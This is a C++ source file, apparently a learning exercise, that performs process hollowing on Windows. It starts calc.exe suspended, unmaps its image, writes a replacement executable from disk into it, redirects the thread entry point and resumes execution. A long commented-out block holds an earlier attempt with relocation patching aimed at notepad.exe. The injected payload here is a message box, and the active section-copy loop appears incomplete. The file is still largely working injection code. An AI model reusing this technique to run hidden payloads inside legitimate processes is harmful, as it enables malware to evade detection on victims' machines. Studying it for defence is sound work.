// ProcessHollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <ShlObj_core.h>

#pragma comment(lib,"ntdll.lib")

using namespace std;

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

int main()
{
	// declaring variables for the Headers
	PIMAGE_DOS_HEADER pDosH;
	PIMAGE_NT_HEADERS pNtH;
	PIMAGE_SECTION_HEADER pSecH;
	
	// declaring variables for process hollowing
	PVOID image, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	CONTEXT ctx;

	ctx.ContextFlags = CONTEXT_FULL;

	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	// create destination process - this is the process to be hollowed out
	printf("\nRunning the destination process\n");

	if (!CreateProcessW(L"C:/Windows/System32/calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("\nError: Unable to run destination process. CreateProcess failed with error %d\n", GetLastError());
		return 1;
	}

	printf("\nProcess created in suspended state.\n");
	printf("\nOpening the replacement executable.\n");

	// Creating replacement executable to be ran
	hFile = CreateFileW(L"C:/Users/wenqi/Desktop/MessageBox.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("\nError: Unable to create the replacement executable. CreateFile failed with error %d\n", GetLastError());
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	// get size of the replacement executable
	nSizeOfFile = GetFileSize(hFile, NULL);

	// allocate memory for the replacement. image will contain a pointer to the allocated memory block
	image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// if cannot read the executable from the disk
	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) {
		printf("\nError: Unable to read the replacement executable. ReadFile failed with error %d\n", GetLastError());
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	NtClose(hFile);

	pDosH = (PIMAGE_DOS_HEADER)image;

	// checking for valid executable by verifying that it starts with the "MZ" signature
	if (pDosH->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("\nError: Invalid executable format.\n");
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	// get the address of the IMAGE_NT_HEADER (address of image + offset from IMAGE_DOS_HEADER)
	pNtH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pDosH->e_lfanew);

	// get the thread context of the child process' primary thread
	NtGetContextThread(pi.hThread, &ctx);

	// reads the base address of the executable image from the PEB of the child process by reading memory at an offset within the PEB, which is obtained from the Rdx register.
	// The offset is calculated as sizeof(SIZE_T) * 2. The base variable stores the base address.
	NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);

	// if the base address of the executable image matches the ImageBase specified in the PE header of the executable image, it proceeds to unmap the original executable image.
	if ((SIZE_T)base == pNtH->OptionalHeader.ImageBase) {
		printf("\nUnmapping original executable image from child process. Address: %#zx\n", (SIZE_T)base);
		NtUnmapViewOfSection(pi.hProcess, base);
	}
	
	printf("\nAllocating memory in child process\n");

	// allocates a region of memory at a specific base address in the child process, the size is determined by the SizeOfImage field. mem will hold the pointer to the newly allocated memory region.
	mem = VirtualAllocEx(pi.hProcess, (PVOID)pNtH->OptionalHeader.ImageBase, pNtH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// if it fails to allocate memory in the process
	if (!mem) {
		printf("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());
		NtTerminateProcess(pi.hProcess, 1);
		return 1;
	}

	printf("\nMemory allocated. Address: %#zx\n", (SIZE_T)mem);
	printf("\nWriting executable image into child process.\n");

	// after allocating memory, will try to write data from the executable to the original process
	NtWriteVirtualMemory(pi.hProcess, mem, image, pNtH->OptionalHeader.SizeOfHeaders, NULL);

	// iterating through sections of the PE**
	for (i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
		pSecH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pDosH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
	}

	// set the eax register to the entry point of the injected image
	ctx.Rcx = (SIZE_T)((LPBYTE)mem + pNtH->OptionalHeader.AddressOfEntryPoint);
	printf("\nNew entry point: %#zx\n", ctx.Rcx);
	
	// write the base address of the injected image into the PEB
	NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtH->OptionalHeader.ImageBase, sizeof(PVOID), NULL);

	// set thread context of the original process' primary thread
	printf("\nSetting the context of the child process's primary thread.\n");
	NtSetContextThread(pi.hThread, &ctx);

	printf("\nResuming child process's primary thread.\n");
	NtResumeThread(pi.hThread, NULL);
	printf("\nThread resumed.\n");

	printf("\nWaiting for child process to terminate.\n");
	NtWaitForSingleObject(pi.hProcess, FALSE, NULL);
	printf("\nProcess terminated.\n");

	NtClose(pi.hThread);
	NtClose(pi.hProcess);
	VirtualFree(image, 0, MEM_RELEASE);

	/*
	// Locating the base address of destination image by acquiring the address of the PEB and reading it
	//PPEB pPEB = ReadRemotePEB(destProcess);

	// Image base is used to read the NT headers
	//PLOADED_IMAGE pImage = ReadRemoteImage(destProcess, pPEB->ImageBaseAddress);

	// get destination imageBase offset address from the PEB
	HMODULE hNTDLL = GetModuleHandleA("ntdll");
	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(myPROCESS_BASIC_INFORMATION), &returnLength);
	//ULONG PebBase = (ULONG)pbi->PebBaseAddress;
	//PVOID pebImageBaseOffset = pbi->PebBaseAddress->ImageBaseAddress;

	if (NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(myPROCESS_BASIC_INFORMATION), &returnLength)) {
		printf("Failed to get the imageBase offset :( , GLE=%u", GetLastError());
	}
	printf("1\n");
	
     // get destination imageBaseAddress
	LPVOID destImageBase = 0;
	SIZE_T bytesRead = NULL;
	sizeof(ULONG);
	//LPCVOID ptrPebImageBaseOffset = (LPCVOID)pebImageBaseOffset;
	ReadProcessMemory(destProcess, pbi->PebBaseAddress->ImageBaseAddress, &destImageBase, 8, &bytesRead);
	printf("2, GLE=%u, bytesRead=%u\n", GetLastError(), bytesRead);
     // read source file - this is the file that will be executed inside the hollowed process
     HANDLE sourceFile = CreateFileA("C:/Windows/System32/notepad.exe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
     //HANDLE sourceFile = CreateFileA("C:/Windows/syswow64/notepad.exe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	printf("3 GLE=%u\n", GetLastError());
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	printf("31 GLE=%u", GetLastError());
	SIZE_T fileBytesRead = 0;
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	printf("32 GLE=%u", GetLastError());
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
	printf("33 GLE=%u", GetLastError());
	
	// get source image size
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
	printf("waeasd GLE=%u", GetLastError());
	// carve out the destination image
     NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	printf("ntunmap GLE=%u", GetLastError());
	myNtUnmapViewOfSection(destProcess, destImageBase);
	if (myNtUnmapViewOfSection) {
		printf("Carving failed :( , GLE=%u", GetLastError());
	}
	printf("4 GLE=%u", GetLastError());

	// allocate new memory in destination image for the source image
	LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	destImageBase = newDestImageBase;
	if (!newDestImageBase) {
		printf("Allocating failed , GLE=%u", GetLastError());
	}
	printf("5");
	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
	DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
	WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
	printf("WriteProcessMemory , GLE=%u", GetLastError());
	printf("6");
	// get pointer to first source image section
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
	int err = GetLastError();

	// copy source image sections to destination
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		printf("WriteProcessMemory%u , GLE=%u", i, GetLastError());
		sourceImageSection++;
	}

	// get address of the relocation table
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// patch the binary with relocations
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
		{
			sourceImageSection++;
			continue;
		}

		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;
				ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
				printf("ReadProcessMemory , GLE=%u", GetLastError());
				patchedBuffer += deltaImageBase;

				WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &fileBytesRead);
				int a = GetLastError();
				printf(" d , GLE=%u", a);
			}
		}
	}

	// get context of the dest process thread
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi->hThread, context);
	if (!GetThreadContext(pi->hThread, context)) {
		printf("Error getting context");
		return 0;
	}

	// update dest image entry point to the new entry point of the source image and resume dest image thread
	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Rax = patchedEntryPoint;
	SetThreadContext(pi->hThread, context);
	if (SetThreadContext(pi->hThread, context)) {
		printf("Error setting context");
		return 0;
	}
	ResumeThread(pi->hThread);
	*/
	
	return 0;

}
